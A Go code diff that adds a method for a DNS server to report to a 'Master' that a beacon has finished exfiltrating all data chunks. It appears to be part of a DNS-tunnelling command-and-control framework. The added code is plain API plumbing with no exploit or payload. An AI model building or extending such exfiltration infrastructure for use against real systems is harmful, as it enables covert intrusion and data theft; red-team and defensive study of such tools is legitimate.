@@ -414,6 +414,44 @@ func (mc *MasterClient) SubmitResult(taskID, beaconID string, chunkIndex, totalC
 	return taskComplete, nil
 }
 
+// MarkTaskComplete notifies the Master that the beacon has finished exfiltrating all chunks
+// This is called when the DNS server receives the RESULT_COMPLETE message from the beacon
+func (mc *MasterClient) MarkTaskComplete(taskID, beaconID string, totalChunks int) error {
+	req := struct {
+		DNSServerID string `json:"dns_server_id"`
+		APIKey      string `json:"api_key"`
+		TaskID      string `json:"task_id"`
+		BeaconID    string `json:"beacon_id"`
+		TotalChunks int    `json:"total_chunks"`
+	}{
+		DNSServerID: mc.serverID,
+		APIKey:      mc.apiKey,
+		TaskID:      taskID,
+		BeaconID:    beaconID,
+		TotalChunks: totalChunks,
+	}
+
+	respData, err := mc.doRequest("POST", "/api/dns-server/result/complete", req)
+	if err != nil {
+		return fmt.Errorf("failed to mark task complete: %w", err)
+	}
+
+	var resp APIResponse
+	if err := json.Unmarshal(respData, &resp); err != nil {
+		return fmt.Errorf("failed to parse response: %w", err)
+	}
+
+	if !resp.Success {
+		return fmt.Errorf("request rejected: %s", resp.Message)
+	}
+
+	if mc.debug {
+		logf("[Master Client] Task %s marked as COMPLETE (%d chunks)", taskID, totalChunks)
+	}
+
+	return nil
+}
+
 // MarkTaskDelivered notifies the Master that this DNS server delivered a task to a beacon
 // This prevents other DNS servers from delivering the same task (Shadow Mesh coordination)
 func (mc *MasterClient) MarkTaskDelivered(taskID string) error {
